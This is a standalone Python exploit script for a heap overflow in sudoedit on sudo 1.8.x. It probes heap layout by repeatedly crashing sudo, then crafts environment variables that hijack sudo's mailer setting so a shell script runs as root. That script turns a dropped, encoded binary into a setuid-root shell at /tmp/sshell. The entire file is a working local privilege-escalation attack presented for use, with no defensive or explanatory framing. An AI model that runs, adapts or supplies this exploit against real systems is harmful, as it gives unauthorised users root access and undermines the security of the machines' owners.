#!/usr/bin/python
import os
import subprocess
import sys
import resource
import select
import signal
from struct import pack
from ctypes import cdll, c_char_p, POINTER

SUDO_PATH = b"/usr/bin/sudo"

SHELL_PATH = b"/tmp/gg" # a shell script file executed by sudo (max length is 31)
SUID_PATH = "/tmp/sshell" # a file that will be owned by root and suid
PWNED_PATH = "/tmp/pwned" # a file that will be created after SHELL_PATH is executed

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)

resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

def create_bin(bin_path):
	if os.path.isfile(bin_path):
		return  # existed
	try:
		os.makedirs(bin_path[:bin_path.rfind('/')])
	except:
		pass
	
	import base64, zlib
	bin_b64 = 'eNqrd/VxY2JkZIABJgY7BhCvgsEBzHdgwAQODBYMMB0gmhVNFpmeCuXBaAYBCJWVGcHPmpUFJDx26Cdl5ukXZzAEhMRnWUfM5GcFAGyiDWs='
	with open(bin_path, 'wb') as f:
		f.write(zlib.decompress(base64.b64decode(bin_b64)))

def create_shell(path, suid_path):
	with open(path, 'w') as f:
		f.write('#!/bin/sh\n')
		f.write('/usr/bin/id >> %s\n' % PWNED_PATH)
		f.write('/bin/chown root.root %s\n' % suid_path)
		f.write('/bin/chmod 4755 %s\n' % suid_path)
	os.chmod(path, 0o755)
		
def execve(filename, cargv, cenvp):
	libc.execve(filename, cargv, cenvp)

def spawn_raw(filename, cargv, cenvp):
	pid = os.fork()
	if pid:
		# parent
		_, exit_code = os.waitpid(pid, 0)
		return exit_code & 0xff7f # remove coredump flag
	else:
		# child
		execve(filename, cargv, cenvp)
		exit(0)

def spawn(filename, argv, envp):
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(envp))(*envp)
	# Note: error with backtrace is print to tty directly. cannot be piped or suppressd
	r, w = os.pipe()
	pid = os.fork()
	if not pid:
		# child
		os.close(r)
		os.dup2(w, 2)
		execve(filename, cargv, cenvp)
		exit(0)
	# parent
	os.close(w)
	# might occur deadlock in heap. kill it if timeout and set exit_code as 6
	# 0.5 second should be enough for execution
	sr, _, _ = select.select([ r ], [], [], 0.5)
	if not sr:
		os.kill(pid, signal.SIGKILL)
	_, exit_code = os.waitpid(pid, 0)
	if not sr: # timeout, assume dead lock in heap
		exit_code = 6
	
	r = os.fdopen(r, 'r')
	err = r.read()
	r.close()
	return exit_code & 0xff7f, err  # remove coredump flag

def has_askpass(err):
	# 'sudoedit: no askpass program specified, try setting SUDO_ASKPASS'
	return 'sudoedit: no askpass program ' in err

def get_sudo_version():
	proc = subprocess.Popen([SUDO_PATH, '-V'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
	for line in proc.stdout:
		line = line.strip()
		if not line:
			continue
		if line.startswith('Sudo version '):
			txt = line[13:].strip()
			pos = txt.rfind('p')
			if pos != -1:
				txt = txt[:pos]
			versions = list(map(int, txt.split('.')))
			break
	
	proc.wait()
	return versions

def check_sudo_version():
	sudo_vers = get_sudo_version()
	assert sudo_vers[0] == 1, "Unexpect sudo major version"
	assert sudo_vers[1] == 8, "Unexpect sudo minor version"
	return sudo_vers[2]

def check_mailer_root():
	if not os.access(SUDO_PATH, os.R_OK):
		print("Cannot determine disble-root-mailer flag")
		return True
	return subprocess.call(['grep', '-q', 'disable-root-mailer', SUDO_PATH]) == 1

def find_cmnd_size():
	argv = [ b"sudoedit", b"-A", b"-s", b"", None ]
	env = [ b'A'*(7+0x4010+0x110-1), b"LC_ALL=C", b"TZ=:", None ]
	
	size_min, size_max = 0xc00, 0x2000
	found_size = 0
	while size_max - size_min > 0x10:
		curr_size = (size_min + size_max) // 2
		curr_size &= 0xfff0
		print("\ncurr size: 0x%x" % curr_size)
		argv[-2] = b"\xfc"*(curr_size-0x10)+b'\\'
		exit_code, err = spawn(SUDO_PATH, argv, env)
		print("\nexit code: %d" % exit_code)
		print(err)
		if exit_code == 256 and has_askpass(err):
			# need pass. no crash.
			# fit or almost fit
			if found_size:
				found_size = curr_size
				break
			# maybe almost fit. try again
			found_size = curr_size
			size_min = curr_size
			size_max = curr_size + 0x20
		elif exit_code in (7, 11):
			# segfault. too big
			if found_size:
				break
			size_max = curr_size
		else:
			assert exit_code == 6
			# heap corruption. too small
			size_min = curr_size
	
	if found_size:
		return found_size
	assert size_min == 0x2000 - 0x10
	# old sudo version and file is in /etc/sudoers.d
	print('has 2 holes. very large one is bad')
	
	size_min, size_max = 0xc00, 0x2000
	for step in (0x400, 0x100, 0x40, 0x10):
		found = False
		env[0] = b'A'*(7+0x4010+0x110-1+step+0x100)
		for curr_size in range(size_min, size_max, step):
			argv[-2] = b"A"*(curr_size-0x10)+b'\\'
			exit_code, err = spawn(SUDO_PATH, argv, env)
			print("\ncurr size: 0x%x" % curr_size)
			print("\nexit code: %d" % exit_code)
			print(err)
			if exit_code in (7, 11):
				size_min = curr_size
				found = True
			elif found:
				print("\nsize_min: 0x%x" % size_min)
				break
		assert found, "Cannot find cmnd size"
		size_max = size_min + step
	
	# TODO: verify		
	return size_min

def find_defaults_chunk(argv, env_prefix):
	offset = 0
	pos = len(env_prefix) - 1
	env = env_prefix[:]
	env.extend([ b"LC_ALL=C", b"TZ=:", None ])
	# overflow until sudo crash without asking pass
	# crash because of defaults.entries.next is overwritten
	while True:
		env[pos] += b'A'*0x10
		exit_code, err = spawn(SUDO_PATH, argv, env)
		# 7 bus error, 11 segfault
		if exit_code in (7, 11) and not has_askpass(err):
			# found it
			env[pos] = env[pos][:-0x10]
			break
		offset += 0x10
	
	# verify if it is defaults
	env = env[:-3]
	env[-1] += b'\x41\\' # defaults chunk size 0x40
	env.extend([
		b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',
		(b'' if has_tailq else b'A'*8) + # prev if no tailq
		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", # entries.next
		(b'A'*8 if has_tailq else b'') + # entries.prev
		pack("<Q", 0xffffffffff600000+0x880) + # var (use vsyscall for testing)
		b"A"*(0x20-1), # binding, file, type, op, error, lineno
		b"LC_ALL=C", b"TZ=:", None
	])
	
	exit_code, err = spawn(SUDO_PATH, argv, env)
	# old sudo verion has no cleanup if authen fail. exit code is 256.
	assert exit_code in (256, 11) and has_askpass(err), "cannot find defaults chunk"
	return offset

def create_env(offset_defaults):
	with open('/proc/sys/kernel/randomize_va_space') as f:
		has_aslr = int(f.read()) != 0
	if has_aslr:
		STACK_ADDR_PAGE = 0x7fffe5d35000
	else:
		STACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled
	
	SA = STACK_ADDR_PAGE

	ADDR_MEMBER_PREV = pack('<Q', SA+8)
	ADDR_MEMBER_LAST = ADDR_MEMBER_PREV

	ADDR_MEMBER = pack('<Q', SA+0x20)
	ADDR_DEF_BINDING = ADDR_MEMBER

	ADDR_MAILER_VAR = pack('<Q', SA+0x20+0x30)
	ADDR_MAILER_VAL = pack('<Q', SA+0x20+0x30+0x10)

	ADDR_ALWAYS_VAR = pack('<Q', SA+0x20+0x30+0x10+0x20)
	ADDR_DEF_BAD    = pack('<Q', SA+0x20+0x30+0x10+0x20+0x10)

	# no need to make cleanup without a crash. mailer is executed before cleanup steps
	# def_mailto is always set
	# def_mailerflags is mailer arguments
	epage = [
		b'A'*0x8 + # to not ending with 0x00
		
		ADDR_MEMBER[:6], b'',  # pointer to member
		ADDR_MEMBER_PREV[:6], b'',  # pointer to member
		
		# member chunk (and defaults->binding (list head))
		b'A'*8 + # chunk size
		b'', b'', b'', b'', b'', b'', b'', b'', # members.first
		ADDR_MEMBER_LAST[:6], b'', # members.last
		b'A'*8 + # member.name (can be any because this object is freed as list head (binding))
		pack('<H', MATCH_ALL), b'',  # type, negated
		b'A'*0xc + # padding
		
		# var (mailer)
		b'A'*8 + # chunk size
		b"mailerpath", b'A'*5 + 
		# val (mailer) (assume path length is less than 32)
		SHELL_PATH, b'A'*(0x20-len(SHELL_PATH)-1) + 
		# var (mail_always)
		b"mail_always", b'A'*4 + 
		
		# defaults (invalid mail_always, has val)
		(b'' if has_tailq else b'A'*8) + # prev if no tailq
		b'', b'', b'', b'', b'', b'', b'', b'', # next
		(b'A'*8 if has_tailq else b'') + # prev if has tailq
		ADDR_ALWAYS_VAR[:6], b'', # var
		ADDR_ALWAYS_VAR[:6], b'', # val (invalid defaults mail_always, trigger sendmail immediately)
		ADDR_DEF_BINDING[:6], b'', # binding or binding.first
	]
	if has_file:
		epage.extend([ ADDR_ALWAYS_VAR[:6], b'' ]) # file
	elif not has_tailq:
		epage.extend([ ADDR_MEMBER[:6], b'' ]) # binding.last
	epage.extend([
		pack('<H', DEFAULTS_CMND) + # type
		b'', b'', # for type is 4 bytes version
	])

	env = [
		b'A'*(7+0x4010+0x110+offset_defaults) +
		b'A'*8 + # chunk metadata
		(b'' if has_tailq else b'A'*8) + # prev if no tailq
		ADDR_DEF_BAD[:6]+b'\\', b'\\', # next
		(b'A'*8 if has_tailq else b'') + # prev if has tailq
		ADDR_MAILER_VAR[:6]+b'\\', b'\\', # var
		ADDR_MAILER_VAL[:6]+b'\\', b'\\', # val
		ADDR_DEF_BINDING[:6]+b'\\', b'\\', # binding or bind.first
	]
	if has_file or not has_tailq:
		env.extend([ ADDR_MEMBER[:6]+b'\\', b'\\' ]) # binding.last or file (no use)
	env.extend([
		pack('<H', DEFAULTS_CMND) + # type
		(b'\x01' if has_file else b'\\'), b'', # if not has_file, type is int (4 bytes)
		b"LC_ALL=C",
		b"TZ=:",
		b"SUDO_ASKPASS=/invalid",
	])

	cnt = sum(map(len, epage))
	padlen = 4096 - cnt - len(epage)
	epage.append(b'P'*(padlen-1))

	ENV_STACK_SIZE_MB = 4
	for i in range(ENV_STACK_SIZE_MB * 1024 // 4):
		env.extend(epage)

	# reserve space in last element for '/usr/bin/sudo' and padding
	env[-1] = env[-1][:-14-8]
	env.append(None)
	return env

def run_until_success(argv, env):
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(env))(*env)

	create_bin(SUID_PATH)
	create_shell(SHELL_PATH, SUID_PATH)

	null_fd = os.open('/dev/null', os.O_RDWR)
	os.dup2(null_fd, 2)

	for i in range(65536):
		sys.stdout.write('%d\r' % i)
		if i % 8 == 0:
			sys.stdout.flush()
		exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
		if os.path.exists(PWNED_PATH):
			print("success at %d" % i)
			if os.stat(PWNED_PATH).st_uid != 0:
				print("ROOT MAILER is disabled :(")
			else:
				print('execute "%s" to get root shell' % SUID_PATH)
			break
		if exit_code not in (7, 11):
			print("invalid offset. exit code: %d" % exit_code)
			break

def main():
	cmnd_size = int(sys.argv[1], 0) if len(sys.argv) > 1 else None
	offset_defaults = int(sys.argv[2], 0) if len(sys.argv) > 2 else None

	if cmnd_size is None:
		cmnd_size = find_cmnd_size()
		print("found cmnd size: 0x%x" % cmnd_size)

	argv = [ b"sudoedit", b"-A", b"-s", b"A"*(cmnd_size-0x10)+b"\\", None ]

	env_prefix = [ b'A'*(7+0x4010+0x110) ]

	if offset_defaults is None:
		offset_defaults = find_defaults_chunk(argv, env_prefix)
	assert offset_defaults != -1

	print('')
	print("cmnd size: 0x%x" % cmnd_size)
	print("offset to defaults: 0x%x" % offset_defaults)

	argv = [ b"sudoedit", b"-A", b"-s", b"A"*(cmnd_size-0x10)+b"\\", None ]
	env = create_env(offset_defaults)
	run_until_success(argv, env)

if __name__ == "__main__":
	# global intialization
	assert check_mailer_root(), "root mailer is disabled"
	sudo_ver = check_sudo_version()
	DEFAULTS_CMND = 269
	if sudo_ver >= 15:
		MATCH_ALL = 284
	elif sudo_ver >= 13:
		MATCH_ALL = 282
	elif sudo_ver >= 7:
		MATCH_ALL = 280
	elif sudo_ver < 7:
		MATCH_ALL = 279
		DEFAULTS_CMND = 268

	has_tailq = sudo_ver >= 9
	has_file = sudo_ver >= 19  # has defaults.file pointer
	main()